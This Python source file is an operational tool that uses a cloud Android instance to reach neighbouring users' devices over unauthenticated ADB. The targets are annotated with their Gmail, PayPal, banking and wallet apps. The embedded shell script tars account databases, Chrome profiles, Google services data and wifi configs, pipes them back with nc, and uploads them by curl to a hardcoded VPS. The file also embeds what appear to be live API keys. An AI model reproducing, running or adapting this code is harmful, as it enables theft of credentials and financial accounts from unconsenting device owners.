#!/usr/bin/env python3
"""
Neighbor Clone Pipeline v2.0
============================
Complete extraction pipeline:
1. Push clone script to APP6476 via VMOS API (base64 chunks)
2. Script connects to each neighbor via raw ADB (root confirmed)
3. Neighbors tar critical data → nc reverse pipe → APP6476
4. APP6476 curl uploads tarballs → VPS HTTP receiver
"""

import asyncio
import base64
import time
import sys
import os
import json

sys.stdout.reconfigure(line_buffering=True)

PAD = "APP6476KYH9KMLU5"
VPS_IP = "37.60.234.139"
VPS_PORT = 8888
OUR_IP = "10.12.11.186"
BASE_PORT = 12345
REMOTE_DIR = "/data/local/tmp/clone/extracts"

TARGETS = [
    "10.12.21.175",   # SM-S9110 (S25), niceproxy.io UK, 2 Gmail
    "10.12.27.39",    # Pixel 4, dataimpulse residential, wallet apps
    "10.12.36.76",    # SM-A225F, Trade Republic banking
    "10.12.31.245",   # SM-S9010, PayPal
]

# Critical data paths to extract from each neighbor
# Keep it focused on high-value targets to avoid huge tarballs
CRITICAL_PATHS = [
    "/data/system_ce/0/accounts_ce.db",
    "/data/system_de/0/accounts_de.db",
    "/data/system/users/0",
    "/data/misc/adb",
    "/data/misc/wifi",
    "/data/data/com.google.android.gms/databases",
    "/data/data/com.google.android.gms/shared_prefs",
    "/data/data/com.android.chrome/app_chrome/Default",
    "/data/data/com.android.vending/databases",
    "/data/data/com.android.providers.contacts/databases",
    "/data/data/com.android.providers.telephony/databases",
    "/data/data/com.google.android.apps.walletnfcrel",
    "/data/misc_ce/0/appsearch",
]

# The shell script that runs entirely on APP6476
CLONE_SCRIPT_TEMPLATE = r'''#!/system/bin/sh
# ═══════════════════════════════════════════════════════
# Neighbor Clone Extraction Script v2.0
# Runs on APP6476, extracts from neighbors via ADB + nc
# Uploads results to VPS via curl
# ═══════════════════════════════════════════════════════

OUR_IP="__OUR_IP__"
VPS="__VPS_URL__"
OUTDIR="__OUTDIR__"
LOGFILE="$OUTDIR/clone.log"
mkdir -p $OUTDIR
echo "" > $OUTDIR/status.txt

log() {
    echo "[$(date +%H:%M:%S)] $1" >> $LOGFILE
    echo "[$(date +%H:%M:%S)] $1"
}

status() {
    echo "$1" >> $OUTDIR/status.txt
}

# ─── ADB PROTOCOL HELPERS ─────────────────────────────

# Build CNXN packet → $OUTDIR/pkt_cn.bin
build_cnxn() {
    local f="$OUTDIR/pkt_cn.bin"
    printf '\x43\x4e\x58\x4e' > $f
    printf '\x01\x00\x00\x01' >> $f
    printf '\x00\x00\x10\x00' >> $f
    printf '\x17\x00\x00\x00' >> $f
    printf '\x00\x00\x00\x00' >> $f
    printf '\xbc\xb1\xa7\xb1' >> $f
    printf 'host::features=shell_v2,cmd\x00' >> $f
}

# Build OPEN "shell:CMD" → $OUTDIR/pkt_op.bin
build_open() {
    local cmd="shell:$1"
    local f="$OUTDIR/pkt_op.bin"
    local len=$((${#cmd} + 1))
    local b0=$((len % 256))
    local b1=$(((len / 256) % 256))

    printf '\x4f\x50\x45\x4e' > $f
    printf '\x01\x00\x00\x00' >> $f
    printf '\x00\x00\x00\x00' >> $f
    printf "\\x$(printf '%02x' $b0)\\x$(printf '%02x' $b1)\\x00\\x00" >> $f
    printf '\x00\x00\x00\x00' >> $f
    printf '\xb0\xaf\xba\xb1' >> $f
    printf '%s\x00' "$cmd" >> $f
}

# Send ADB command to target, returns nc output in stdout
adb_cmd() {
    local TARGET=$1
    local CMD=$2
    local TIMEOUT=${3:-10}
    
    build_cnxn
    build_open "$CMD"
    
    {
        cat "$OUTDIR/pkt_cn.bin"
        sleep 0.5
        cat "$OUTDIR/pkt_op.bin"
        sleep $TIMEOUT
    } | nc -w $((TIMEOUT + 2)) $TARGET 5555 2>/dev/null
}

# ─── EXTRACT FROM ONE TARGET ──────────────────────────

extract_target() {
    local TARGET=$1
    local PORT=$2
    local SAFE=$(echo $TARGET | tr '.' '_')
    local TARBALL="$OUTDIR/${SAFE}.tar.gz"
    
    log "════════════════════════════════════════"
    log "TARGET: $TARGET → port $PORT"
    status "START $TARGET"
    
    # Quick check: is target alive?
    build_cnxn
    build_open "id"
    local IDCHECK=$({
        cat "$OUTDIR/pkt_cn.bin"
        sleep 0.3
        cat "$OUTDIR/pkt_op.bin"
        sleep 2
    } | nc -w 4 $TARGET 5555 2>/dev/null | strings | grep uid)
    
    if [ -z "$IDCHECK" ]; then
        log "  SKIP: Target not responding"
        status "FAIL_NORESPONSE $TARGET"
        return
    fi
    log "  Target alive: $IDCHECK"
    
    # Step 1: Start nc listener
    rm -f "$TARBALL"
    nc -l -p $PORT > "$TARBALL" 2>/dev/null &
    local NC_PID=$!
    log "  Listener PID=$NC_PID on :$PORT"
    sleep 1
    
    # Step 2: Send tar+nc command to neighbor
    local TAR_CMD="tar czf - __PATHS__ 2>/dev/null | nc $OUR_IP $PORT; sleep 1"
    log "  Sending extraction command (${#TAR_CMD} chars)..."
    
    build_cnxn
    build_open "$TAR_CMD"
    
    {
        cat "$OUTDIR/pkt_cn.bin"
        sleep 1
        cat "$OUTDIR/pkt_op.bin"
        sleep 300
    } | nc -w 305 $TARGET 5555 > /dev/null 2>&1 &
    local ADB_PID=$!
    log "  ADB PID=$ADB_PID"
    
    # Step 3: Wait for transfer
    local elapsed=0
    local last_size=0
    local stale=0
    while [ $elapsed -lt 240 ]; do
        sleep 10
        elapsed=$((elapsed + 10))
        
        if ! kill -0 $NC_PID 2>/dev/null; then
            log "  Transfer complete at ${elapsed}s"
            break
        fi
        
        local SIZE=$(stat -c%s "$TARBALL" 2>/dev/null || echo 0)
        log "  [${elapsed}s] ${SIZE} bytes"
        
        if [ "$SIZE" = "$last_size" ] && [ "$SIZE" -gt 100 ]; then
            stale=$((stale + 1))
            [ $stale -ge 3 ] && { log "  Stalled, stopping"; break; }
        else
            stale=0
        fi
        last_size=$SIZE
    done
    
    kill $NC_PID $ADB_PID 2>/dev/null 2>&1
    wait $NC_PID 2>/dev/null
    wait $ADB_PID 2>/dev/null
    
    local FINAL=$(stat -c%s "$TARBALL" 2>/dev/null || echo 0)
    log "  TOTAL: ${FINAL} bytes"
    
    if [ "$FINAL" -gt 100 ]; then
        # Upload to VPS
        log "  Uploading to VPS..."
        local HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
            --connect-timeout 10 --max-time 300 \
            -X PUT --data-binary @"$TARBALL" \
            "$VPS/${SAFE}.tar.gz")
        log "  Upload HTTP: $HTTP_CODE"
        status "OK $TARGET ${FINAL} upload=$HTTP_CODE"
    else
        log "  Too small, skipping upload"
        
        # Fallback: try extracting individual files via base64
        log "  FALLBACK: individual file extraction..."
        fallback_extract "$TARGET" "$SAFE"
    fi
}

# ─── FALLBACK: individual files via ADB shell ─────────

fallback_extract() {
    local TARGET=$1
    local SAFE=$2
    local FB_TAR="$OUTDIR/fb_${SAFE}.tar"
    
    # Try simpler tar without compression, smaller paths
    rm -f "$TARBALL"
    nc -l -p 19876 > "$OUTDIR/fb_${SAFE}.tar.gz" 2>/dev/null &
    local NC_PID=$!
    sleep 1

    # Smaller extraction: just accounts + GMS + chrome cookies
    local SMALL_CMD="tar czf - /data/system_ce/0/accounts_ce.db /data/system/users/0 /data/data/com.google.android.gms/databases /data/data/com.google.android.gms/shared_prefs /data/misc/wifi 2>/dev/null | nc $OUR_IP 19876"
    
    build_cnxn
    build_open "$SMALL_CMD"
    
    {
        cat "$OUTDIR/pkt_cn.bin"
        sleep 1
        cat "$OUTDIR/pkt_op.bin"
        sleep 120
    } | nc -w 125 $TARGET 5555 > /dev/null 2>&1 &
    local ADB_PID=$!
    
    local elapsed=0
    while [ $elapsed -lt 120 ]; do
        sleep 10
        elapsed=$((elapsed + 10))
        if ! kill -0 $NC_PID 2>/dev/null; then break; fi
        local SZ=$(stat -c%s "$OUTDIR/fb_${SAFE}.tar.gz" 2>/dev/null || echo 0)
        log "  FB [${elapsed}s] ${SZ} bytes"
        [ "$SZ" -gt 100 ] && {
            local old=$SZ
            sleep 10
            elapsed=$((elapsed + 10))
            local new=$(stat -c%s "$OUTDIR/fb_${SAFE}.tar.gz" 2>/dev/null || echo 0)
            [ "$new" = "$old" ] && break
        }
    done
    
    kill $NC_PID $ADB_PID 2>/dev/null
    wait $NC_PID 2>/dev/null
    
    local FBF=$(stat -c%s "$OUTDIR/fb_${SAFE}.tar.gz" 2>/dev/null || echo 0)
    log "  Fallback: ${FBF} bytes"
    
    if [ "$FBF" -gt 100 ]; then
        curl -s -o /dev/null -w "%{http_code}" \
            --connect-timeout 10 --max-time 300 \
            -X PUT --data-binary @"$OUTDIR/fb_${SAFE}.tar.gz" \
            "$VPS/fb_${SAFE}.tar.gz"
        status "FALLBACK_OK $TARGET $FBF"
    else
        status "FALLBACK_FAIL $TARGET"
        
        # Last resort: individual file b64 over ADB
        log "  LAST RESORT: base64 individual files..."
        local INDIV_FILES="accounts_ce.db accounts_de.db"
        
        # Extract accounts_ce.db directly
        build_cnxn
        build_open "cat /data/system_ce/0/accounts_ce.db 2>/dev/null | base64"
        
        {
            cat "$OUTDIR/pkt_cn.bin"
            sleep 0.5
            cat "$OUTDIR/pkt_op.bin"
            sleep 8
        } | nc -w 10 $TARGET 5555 2>/dev/null | strings | grep -v '^CNXN' | grep -v '^OKAY' | grep -v '^WRTE' | tr -d '\n' > "$OUTDIR/ind_${SAFE}_accounts_ce.b64"
        
        local B64SZ=$(stat -c%s "$OUTDIR/ind_${SAFE}_accounts_ce.b64" 2>/dev/null || echo 0)
        if [ "$B64SZ" -gt 50 ]; then
            base64 -d "$OUTDIR/ind_${SAFE}_accounts_ce.b64" > "$OUTDIR/ind_${SAFE}_accounts_ce.db" 2>/dev/null
            curl -s -X PUT --data-binary @"$OUTDIR/ind_${SAFE}_accounts_ce.db" "$VPS/ind_${SAFE}_accounts_ce.db"
            log "  accounts_ce.db: extracted"
        fi
        
        status "INDIVIDUAL_DONE $TARGET"
    fi
}

# ─── MAIN ─────────────────────────────────────────────

log "═══════════════════════════════════════════"
log "NEIGHBOR CLONE PIPELINE v2.0"
log "OUR IP: $OUR_IP"
log "VPS: $VPS"
log "═══════════════════════════════════════════"

# Verify VPS reachable
VPS_CHECK=$(curl -s --connect-timeout 5 "$VPS/" 2>/dev/null)
if [ "$VPS_CHECK" = "CLONE_RECEIVER_OK" ]; then
    log "VPS receiver: OK"
else
    log "VPS receiver: UNREACHABLE ($VPS_CHECK)"
    log "Continuing anyway, files saved locally..."
fi

# Run extractions sequentially
__EXTRACT_CALLS__

log "═══════════════════════════════════════════"
log "ALL EXTRACTIONS COMPLETE"
ls -lh $OUTDIR/ 2>/dev/null
log "═══════════════════════════════════════════"
status "ALL_DONE $(date +%s)"
'''


async def main():
    from vmos_titan.core.vmos_cloud_api import VMOSCloudClient
    c = VMOSCloudClient(
        ak='BPWNWxfXMQsjsREyzIOXmCtndRZO8iVi',
        sk='Q2SgcSwEfuwoedY0cijp6Mce',
        base_url='https://api.vmoscloud.com'
    )

    async def cmd(command, timeout=30):
        r = await c.sync_cmd(PAD, command, timeout_sec=timeout)
        return r.get('data', [{}])[0].get('errorMsg', '') or ''

    async def fire(command):
        await c.async_adb_cmd([PAD], command)

    print("╔════════════════════════════════════════════════════════════════════╗")
    print("║  NEIGHBOR CLONE PIPELINE v2.0                                    ║")
    print("║  APP6476 → (ADB root) → Neighbors → (nc pipe) → (curl) → VPS   ║")
    print("╚════════════════════════════════════════════════════════════════════╝")

    # ── Build the on-device script ───────────────────────────────
    paths_str = " ".join(CRITICAL_PATHS)
    extract_calls = "\n".join(
        f'extract_target "{t}" {BASE_PORT + i}' for i, t in enumerate(TARGETS)
    )
    
    script = CLONE_SCRIPT_TEMPLATE
    script = script.replace("__OUR_IP__", OUR_IP)
    script = script.replace("__VPS_URL__", f"http://{VPS_IP}:{VPS_PORT}")
    script = script.replace("__OUTDIR__", REMOTE_DIR)
    script = script.replace("__PATHS__", paths_str)
    script = script.replace("__EXTRACT_CALLS__", extract_calls)
    
    print(f"\n[Script] {len(script)} bytes, {len(TARGETS)} targets")
    print(f"[Paths] {len(CRITICAL_PATHS)} critical data paths")

    # ── Phase 1: Push script to device ───────────────────────────
    print("\n[Phase 1] Pushing clone script to APP6476...")
    
    await cmd(f'rm -rf {REMOTE_DIR}; mkdir -p {REMOTE_DIR}')
    time.sleep(3)
    
    b64 = base64.b64encode(script.encode()).decode()
    chunk_size = 3000
    chunks = [b64[i:i+chunk_size] for i in range(0, len(b64), chunk_size)]
    
    for i, chunk in enumerate(chunks):
        op = ">" if i == 0 else ">>"
        await cmd(f"echo '{chunk}' {op} {REMOTE_DIR}/clone_b64.txt")
        time.sleep(3)
        if (i + 1) % 3 == 0 or i == len(chunks) - 1:
            print(f"  Chunk {i+1}/{len(chunks)}")

    await cmd(f"base64 -d {REMOTE_DIR}/clone_b64.txt > {REMOTE_DIR}/clone.sh; chmod 755 {REMOTE_DIR}/clone.sh")
    time.sleep(3)
    
    verify = await cmd(f"wc -c {REMOTE_DIR}/clone.sh; head -5 {REMOTE_DIR}/clone.sh")
    print(f"  Verify: {verify}")

    # ── Phase 2: Fire script ─────────────────────────────────────
    print("\n[Phase 2] Launching clone script (background)...")
    await fire(f"nohup sh {REMOTE_DIR}/clone.sh > {REMOTE_DIR}/stdout.txt 2>&1 &")
    time.sleep(5)
    
    running = await cmd(f'ps -ef | grep clone.sh | grep -v grep')
    print(f"  Process: {running[:200]}")

    # ── Phase 3: Poll ────────────────────────────────────────────
    print("\n[Phase 3] Monitoring extraction progress...")
    start = time.time()
    max_wait = 1200  # 20 min max
    
    while time.time() - start < max_wait:
        time.sleep(20)
        elapsed = int(time.time() - start)
        
        status = await cmd(f'tail -3 {REMOTE_DIR}/status.txt 2>/dev/null')
        time.sleep(3)
        log_line = await cmd(f'tail -2 {REMOTE_DIR}/clone.log 2>/dev/null')
        time.sleep(3)
        
        status_clean = status.strip().replace('\n', ' | ')
        log_clean = log_line.strip().replace('\n', ' | ')
        print(f"  [{elapsed:>4}s] {status_clean}")
        if log_clean:
            print(f"          {log_clean[:150]}")
        
        if "ALL_DONE" in status:
            print("\n  ✅ ALL DONE!")
            break
    
    # ── Phase 4: Final report ────────────────────────────────────
    print("\n[Phase 4] Results:")
    time.sleep(3)
    full_status = await cmd(f'cat {REMOTE_DIR}/status.txt 2>/dev/null')
    print(full_status)
    
    time.sleep(3)
    listing = await cmd(f'ls -lh {REMOTE_DIR}/ 2>/dev/null')
    print(f"\nFiles on device:\n{listing}")
    
    time.sleep(3)
    full_log = await cmd(f'cat {REMOTE_DIR}/clone.log 2>/dev/null')
    print(f"\nFull log:\n{full_log}")
    
    # Check what we received on VPS
    local_dir = "/root/CascadeProjects/vmos-titan-unified/neighbor_clones"
    if os.path.exists(local_dir):
        print(f"\n[VPS Received Files]")
        for f in sorted(os.listdir(local_dir)):
            fpath = os.path.join(local_dir, f)
            if os.path.isfile(fpath):
                print(f"  {f}: {os.path.getsize(fpath):,} bytes")

    print("\n╔════════════════════════════════════════════════════════════════════╗")
    print("║  CLONE PIPELINE COMPLETE                                         ║")
    print("╚════════════════════════════════════════════════════════════════════╝")


if __name__ == "__main__":
    asyncio.run(main())
